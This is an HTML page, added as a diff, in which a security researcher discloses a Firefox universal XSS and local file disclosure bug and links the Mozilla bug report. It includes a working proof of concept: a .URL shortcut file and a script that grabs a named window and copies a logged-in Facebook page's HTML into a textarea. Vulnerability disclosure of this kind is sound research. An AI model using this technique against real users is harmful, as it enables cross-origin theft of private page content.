@@ -1,0 +1,97 @@
+<!doctype html>
+<html>
+<head>
+	<title>FireFox Universal XSS and Local File Disclosure (SEC-MODERATE) - Abdulrahman Al-Qabandi</title>
+	<link href="../q.css" rel="stylesheet">
+	
+
+</head>
+<body>
+<div id="qLogo"><img src="../q.png"/>
+<div id="qNav">
+<a href="../">Home</a>
+<a href="../About">About</a>
+<a href="../Tools">Tools</a>
+<a href="../Links">Links</a>
+<a href="https://www.twitter.com/qab" target="_BLANK">Twitter</a>
+<a href="../Stuff">Stuff</a>
+
+</div>
+</div>
+
+
+
+<div id="qWriteup">
+<h1>FireFox Universal XSS and Local File Disclosure (SEC-MODERATE)</h1>
+<br>
+
+<p>
+Few months back, I reported and wrote about a behavior in FireFox which was deemed by design. The writeup was <a href="../FireFox-Arbitrary-Local-File-Disclosure-(NO-FIX)/" target="_BLANK">Firefox Arbitrary Local File Disclosure </a>where a user can read the files in the same directory as an opened HTML file.<br>
+<br>In this writeup we will see how that behavior helped us achieve a serious vulnerability in FireFox in conjunction with a bypass that only works on locally opened documents.<br>
+<br>
+I remember tweeting about the .URL file a while back, which is an 'Internet Shortcut' file and to sum up its usage, its essensially a file that you can open on a desktop which in turn will direct your default browser to the website.<br>
+<blockquote class="twitter-tweet" data-lang="en"><p lang="en" dir="ltr">Is there <a href="https://twitter.com/hashtag/XSS?src=hash">#XSS</a> possibility?:<br>content of &#39;file://C:/q.url&#39;:<br>[InternetShortcut]\nURL=data:text/html,&lt;b&gt;a&lt;/b&gt;<br>Open with <a href="https://twitter.com/hashtag/IE11?src=hash">#IE11</a> <a href="https://twitter.com/0x6D6172696F">@0x6D6172696F</a></p>&mdash; Abdulrhman Alqabandi (@Qab) <a href="https://twitter.com/Qab/status/646141999209250816">September 22, 2015</a></blockquote>
+<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>
+
+Firefox is one of the only browsers (other than IE) that handles .URL files specifically (and .desktop files for Ubuntu which do the same) and so I simply opened a .URL using firefox locally and the reference to that window was always 100% accessable.<br>
+This meant I could open a window (or an iframe) to any file on the system including websites and be able to read all of the data (using something like URLWindow.document.body.innerHTML).
+</p>
+
+<h2>The PoC</h2>
+
+<p>
+The following is the original PoC reported:<br>
+
+<!-- HTML generated using hilite.me --><div class="qCode" style=" overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #000080; font-weight: bold">&lt;a</span> <span style="color: #FF0000">href=</span><span style="color: #0000FF">&quot;p.url&quot;</span> <span style="color: #FF0000">target=</span><span style="color: #0000FF">&quot;qab&quot;</span> <span style="color: #FF0000">id=</span><span style="color: #0000FF">&quot;qAnchor&quot;</span><span style="color: #000080; font-weight: bold">&gt;</span>With .url (will bypass)<span style="color: #000080; font-weight: bold">&lt;/a&gt;&lt;br&gt;</span>
+
+<span style="color: #000080; font-weight: bold">&lt;textarea</span> <span style="color: #FF0000">style=</span><span style="color: #0000FF">&quot;width:600px;height:700px;&quot;</span> <span style="color: #FF0000">id=</span><span style="color: #0000FF">&quot;qresult&quot;</span><span style="color: #000080; font-weight: bold">&gt;&lt;/textarea&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;script&gt;</span>
+<span style="color: #000080; font-weight: bold">var</span> q;
+qAnchor.onclick=<span style="color: #000080; font-weight: bold">function</span>(){
+	setTimeout(<span style="color: #000080; font-weight: bold">function</span>(){
+		q=open(<span style="color: #0000FF">&#39;https://m.facebook.com/#1&#39;</span>,<span style="color: #0000FF">&#39;qab&#39;</span>);
+		
+		setTimeout(<span style="color: #000080; font-weight: bold">function</span>(){
+			qresult.value=q.document.body.innerHTML;
+		},<span style="color: #0000FF">1500</span>);
+	},<span style="color: #0000FF">2500</span>);
+}
+<span style="color: #000080; font-weight: bold">&lt;/script&gt;</span>
+</pre></div>
+
+<br>
+
+The contents of 'p.url':<br>
+<!-- HTML generated using hilite.me --><div class="qCode" style="overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">[InternetShortcut]
+URL=https://m.facebook.com/
+</pre></div>
+
+
+<br>
+What's happening is:<br><br>
+1- User opens a .URL file using an anchor tag and name of window will be 'qab'<br>
+2- The opened 'qab' window will redirect to facebook<br>
+3- There is a mouse event listener which will simply get a reference to the opened window using window.open + the known name 'qab'<br>
+4- Facebooks page is copied into the text area<br>
+<br>
+After that we basically have a window reference inside 'q' which is 100% accessible by us from the original window.<br><br>
+<img src="../qimg/bypass-screenshot2.png"/><br>
+<br>
+Worth pointing out I managed to reduce the steps required for a potential victim by just having a potential victim simply save a web page and open that web page locally.
+</p>
+<br>
+<h2>References:</h2>
+<b>The Bugzilla report:</b> <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1278013" target="_blank">https://bugzilla.mozilla.org/show_bug.cgi?id=1278013</a> (Note: The report is still hidden)
+<br>
+<b>Ubuntu .URL equal, the .DESKTOP</b> <a href="https://help.ubuntu.com/community/UnityLaunchersAndDesktopFiles">https://help.ubuntu.com/community/UnityLaunchersAndDesktopFiles</a>
+
+</p>
+
+</div>
+<br>
+	<script type="application/javascript" src="../q.js">
+
+	
+	</script>
+</body>
+</html>
